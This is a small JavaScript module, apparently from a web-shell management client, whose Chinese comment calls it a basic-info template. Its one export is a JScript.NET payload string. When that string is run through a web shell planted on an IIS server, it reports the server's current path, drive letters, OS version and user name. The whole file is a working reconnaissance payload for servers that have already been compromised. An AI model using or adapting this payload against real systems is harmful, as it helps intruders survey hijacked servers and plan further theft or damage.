/**
 * 基础信息模板
 * ? 获取当前路径、盘符列表
 */

module.exports = () => ({
  info:
    `var c=System.IO.Directory.GetLogicalDrives();Response.Write(Server.MapPath(".")+"\t");for(var i=0;i<=c.length-1;i++)Response.Write(c[i][0]+":");Response.Write("\t"+Environment.OSVersion+"\t");Response.Write(Environment.UserName);`
})
